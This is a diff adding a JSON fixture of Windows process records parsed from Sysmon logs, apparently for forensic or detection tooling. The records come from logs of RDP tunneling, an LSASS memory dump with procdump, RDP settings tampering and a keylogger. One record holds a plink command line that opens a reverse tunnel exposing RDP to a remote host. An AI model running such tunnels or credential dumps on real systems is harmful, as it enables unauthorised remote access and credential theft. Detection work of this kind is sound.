@@ -1,0 +1,456 @@
+[
+  {
+    "process_guid": "{365abb72-d695-5c67-0000-00103c3e0100}",
+    "name": "C:\\Windows\\System32\\svchost.exe",
+    "pid": 1608,
+    "cmdline": null,
+    "user": "NT AUTHORITY\\LOCAL SERVICE",
+    "user_domain": "NT AUTHORITY",
+    "user_name": "LOCAL SERVICE",
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC01.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940897"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-dfad-5c67-0000-0010e0811500}",
+    "name": "C:\\Users\\IEUser\\Desktop\\plink.exe",
+    "pid": 2312,
+    "cmdline": "plink.exe  10.0.2.18 -P 80 -C -R 127.0.0.3:4444:127.0.0.2:3389 -l test -pw test",
+    "user": "PC01\\IEUser",
+    "user_domain": "PC01",
+    "user_name": "IEUser",
+    "logon_id": "0x26656",
+    "parent_guid": "{365abb72-d92a-5c67-0000-0010cb580900}",
+    "host": "PC01.example.corp",
+    "created_at": "2019-02-16T10:02:21.934000+00:00",
+    "create_ref": "DE_sysmon-3-rdp-tun.evtx#1940899",
+    "has_create_event": true,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940899",
+      "DE_sysmon-3-rdp-tun.evtx#1940900",
+      "DE_sysmon-3-rdp-tun.evtx#1940901"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-d92a-5c67-0000-0010cb580900}",
+    "name": "C:\\Windows\\System32\\cmd.exe",
+    "pid": null,
+    "cmdline": "\"C:\\Windows\\system32\\cmd.exe\" ",
+    "user": null,
+    "user_domain": null,
+    "user_name": null,
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC01.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": []
+  },
+  {
+    "process_guid": "{365abb72-d693-5c67-0000-0010c4180100}",
+    "name": "C:\\Windows\\System32\\svchost.exe",
+    "pid": 1276,
+    "cmdline": null,
+    "user": "NT AUTHORITY\\NETWORK SERVICE",
+    "user_domain": "NT AUTHORITY",
+    "user_name": "NETWORK SERVICE",
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC01.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940902"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-e004-5c67-0000-00107c9b1500}",
+    "name": "C:\\Windows\\System32\\UI0Detect.exe",
+    "pid": 2504,
+    "cmdline": "UI0Detect.exe 224",
+    "user": "PC01\\IEUser",
+    "user_domain": "PC01",
+    "user_name": "IEUser",
+    "logon_id": "0x26656",
+    "parent_guid": "{365abb72-d6a2-5c67-0000-0010bc390200}",
+    "host": "PC01.example.corp",
+    "created_at": "2019-02-16T10:03:48.048000+00:00",
+    "create_ref": "DE_sysmon-3-rdp-tun.evtx#1940906",
+    "has_create_event": true,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940906"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-d6a2-5c67-0000-0010bc390200}",
+    "name": "C:\\Windows\\System32\\UI0Detect.exe",
+    "pid": null,
+    "cmdline": "C:\\Windows\\system32\\UI0Detect.exe",
+    "user": null,
+    "user_domain": null,
+    "user_name": null,
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC01.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": []
+  },
+  {
+    "process_guid": "{365abb72-e014-5c67-0000-0010fca01500}",
+    "name": "C:\\Windows\\System32\\smss.exe",
+    "pid": 3444,
+    "cmdline": "\\SystemRoot\\System32\\smss.exe 00000000 0000003c ",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "user_domain": "NT AUTHORITY",
+    "user_name": "SYSTEM",
+    "logon_id": "0x3e7",
+    "parent_guid": "{365abb72-5517-5c68-0000-0010732a0000}",
+    "host": "PC01.example.corp",
+    "created_at": "2019-02-16T10:04:04.141000+00:00",
+    "create_ref": "DE_sysmon-3-rdp-tun.evtx#1940908",
+    "has_create_event": true,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940908"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-5517-5c68-0000-0010732a0000}",
+    "name": "C:\\Windows\\System32\\smss.exe",
+    "pid": null,
+    "cmdline": "\\SystemRoot\\System32\\smss.exe",
+    "user": null,
+    "user_domain": null,
+    "user_name": null,
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC01.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": []
+  },
+  {
+    "process_guid": "{365abb72-e014-5c67-0000-00104aa11500}",
+    "name": "C:\\Windows\\System32\\csrss.exe",
+    "pid": 3344,
+    "cmdline": "%%SystemRoot%%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "user_domain": "NT AUTHORITY",
+    "user_name": "SYSTEM",
+    "logon_id": "0x3e7",
+    "parent_guid": "{365abb72-e014-5c67-0000-0010fca01500}",
+    "host": "PC01.example.corp",
+    "created_at": "2019-02-16T10:04:04.151000+00:00",
+    "create_ref": "DE_sysmon-3-rdp-tun.evtx#1940909",
+    "has_create_event": true,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940909"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-e014-5c67-0000-001013a21500}",
+    "name": "C:\\Windows\\System32\\winlogon.exe",
+    "pid": 2516,
+    "cmdline": "winlogon.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "user_domain": "NT AUTHORITY",
+    "user_name": "SYSTEM",
+    "logon_id": "0x3e7",
+    "parent_guid": "{365abb72-e014-5c67-0000-0010fca01500}",
+    "host": "PC01.example.corp",
+    "created_at": "2019-02-16T10:04:04.211000+00:00",
+    "create_ref": "DE_sysmon-3-rdp-tun.evtx#1940910",
+    "has_create_event": true,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940910"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-e014-5c67-0000-001023a71500}",
+    "name": "C:\\Windows\\System32\\LogonUI.exe",
+    "pid": 3780,
+    "cmdline": "\"LogonUI.exe\" /flags:0x0",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "user_domain": "NT AUTHORITY",
+    "user_name": "SYSTEM",
+    "logon_id": "0x3e7",
+    "parent_guid": "{365abb72-e014-5c67-0000-001013a21500}",
+    "host": "PC01.example.corp",
+    "created_at": "2019-02-16T10:04:04.331000+00:00",
+    "create_ref": "DE_sysmon-3-rdp-tun.evtx#1940914",
+    "has_create_event": true,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940914"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-e014-5c67-0000-001024b71500}",
+    "name": "C:\\Windows\\System32\\smss.exe",
+    "pid": 3064,
+    "cmdline": "\\SystemRoot\\System32\\smss.exe 00000000 0000003c ",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "user_domain": "NT AUTHORITY",
+    "user_name": "SYSTEM",
+    "logon_id": "0x3e7",
+    "parent_guid": "{365abb72-5517-5c68-0000-0010732a0000}",
+    "host": "PC01.example.corp",
+    "created_at": "2019-02-16T10:04:04.882000+00:00",
+    "create_ref": "DE_sysmon-3-rdp-tun.evtx#1940915",
+    "has_create_event": true,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940915"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-e014-5c67-0000-001090b71500}",
+    "name": "C:\\Windows\\System32\\csrss.exe",
+    "pid": 3204,
+    "cmdline": "%%SystemRoot%%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "user_domain": "NT AUTHORITY",
+    "user_name": "SYSTEM",
+    "logon_id": "0x3e7",
+    "parent_guid": "{365abb72-e014-5c67-0000-001024b71500}",
+    "host": "PC01.example.corp",
+    "created_at": "2019-02-16T10:04:04.892000+00:00",
+    "create_ref": "DE_sysmon-3-rdp-tun.evtx#1940916",
+    "has_create_event": true,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940916"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-e014-5c67-0000-001094b81500}",
+    "name": "C:\\Windows\\System32\\winlogon.exe",
+    "pid": 2988,
+    "cmdline": "winlogon.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "user_domain": "NT AUTHORITY",
+    "user_name": "SYSTEM",
+    "logon_id": "0x3e7",
+    "parent_guid": "{365abb72-e014-5c67-0000-001024b71500}",
+    "host": "PC01.example.corp",
+    "created_at": "2019-02-16T10:04:04.952000+00:00",
+    "create_ref": "DE_sysmon-3-rdp-tun.evtx#1940917",
+    "has_create_event": true,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940917"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-e015-5c67-0000-00103fc01500}",
+    "name": "C:\\Windows\\System32\\LogonUI.exe",
+    "pid": 2920,
+    "cmdline": "\"LogonUI.exe\" /flags:0x0",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "user_domain": "NT AUTHORITY",
+    "user_name": "SYSTEM",
+    "logon_id": "0x3e7",
+    "parent_guid": "{365abb72-e014-5c67-0000-001094b81500}",
+    "host": "PC01.example.corp",
+    "created_at": "2019-02-16T10:04:05.232000+00:00",
+    "create_ref": "DE_sysmon-3-rdp-tun.evtx#1940924",
+    "has_create_event": true,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940924"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-e015-5c67-0000-0010d0c61500}",
+    "name": "C:\\Windows\\System32\\TSTheme.exe",
+    "pid": 3712,
+    "cmdline": "C:\\Windows\\system32\\TSTheme.exe -Embedding",
+    "user": "PC01\\IEUser",
+    "user_domain": "PC01",
+    "user_name": "IEUser",
+    "logon_id": "0x26656",
+    "parent_guid": "{365abb72-551f-5c68-0000-001079710000}",
+    "host": "PC01.example.corp",
+    "created_at": "2019-02-16T10:04:05.453000+00:00",
+    "create_ref": "DE_sysmon-3-rdp-tun.evtx#1940925",
+    "has_create_event": true,
+    "name_conflicts": [],
+    "refs": [
+      "DE_sysmon-3-rdp-tun.evtx#1940925"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-551f-5c68-0000-001079710000}",
+    "name": "C:\\Windows\\System32\\svchost.exe",
+    "pid": null,
+    "cmdline": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
+    "user": null,
+    "user_domain": null,
+    "user_name": null,
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC01.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": []
+  },
+  {
+    "process_guid": "{365abb72-9b75-5c8e-0000-0010013f1200}",
+    "name": "C:\\Users\\IEUser\\Desktop\\procdump.exe",
+    "pid": 1856,
+    "cmdline": null,
+    "user": null,
+    "user_domain": null,
+    "user_name": null,
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC04.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": [
+      "sysmon_10_11_lsass_memdump.evtx#4433",
+      "sysmon_10_11_lsass_memdump.evtx#4434"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-0886-5c8f-0000-001030560000}",
+    "name": "C:\\Windows\\system32\\lsass.exe",
+    "pid": 476,
+    "cmdline": null,
+    "user": null,
+    "user_domain": null,
+    "user_name": null,
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC04.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": [
+      "sysmon_10_11_lsass_memdump.evtx#4434"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-9b85-5c8e-0000-0010c4cc1200}",
+    "name": "C:\\Windows\\system32\\taskmgr.exe",
+    "pid": 3576,
+    "cmdline": null,
+    "user": null,
+    "user_domain": null,
+    "user_name": null,
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC04.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": [
+      "sysmon_10_11_lsass_memdump.evtx#4441"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-a965-5c8e-0000-0010d9100400}",
+    "name": "C:\\Windows\\Explorer.EXE",
+    "pid": 3884,
+    "cmdline": null,
+    "user": null,
+    "user_domain": null,
+    "user_name": null,
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC04.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": [
+      "sysmon_13_rdp_settings_tampering.evtx#5252",
+      "sysmon_13_rdp_settings_tampering.evtx#5253"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-ab70-5c8e-0000-0010df1f0a00}",
+    "name": "C:\\Users\\IEUser\\Desktop\\RDPWrap-v1.6.2\\RDPWInst.exe",
+    "pid": 3700,
+    "cmdline": null,
+    "user": null,
+    "user_domain": null,
+    "user_name": null,
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC04.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": [
+      "sysmon_13_rdp_settings_tampering.evtx#5265",
+      "sysmon_13_rdp_settings_tampering.evtx#5267",
+      "sysmon_13_rdp_settings_tampering.evtx#5269"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-ac79-5c8e-0000-0010e1b50d00}",
+    "name": "C:\\Windows\\regedit.exe",
+    "pid": 2872,
+    "cmdline": null,
+    "user": null,
+    "user_domain": null,
+    "user_name": null,
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC04.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": [
+      "sysmon_13_rdp_settings_tampering.evtx#5329"
+    ]
+  },
+  {
+    "process_guid": "{365abb72-b138-5c8e-0000-001004f51200}",
+    "name": "C:\\Users\\IEUser\\Desktop\\keylogger_directx.exe",
+    "pid": 848,
+    "cmdline": null,
+    "user": null,
+    "user_domain": null,
+    "user_name": null,
+    "logon_id": null,
+    "parent_guid": null,
+    "host": "PC04.example.corp",
+    "created_at": null,
+    "create_ref": null,
+    "has_create_event": false,
+    "name_conflicts": [],
+    "refs": [
+      "sysmon_13_keylogger_directx.evtx#5589"
+    ]
+  }
+]
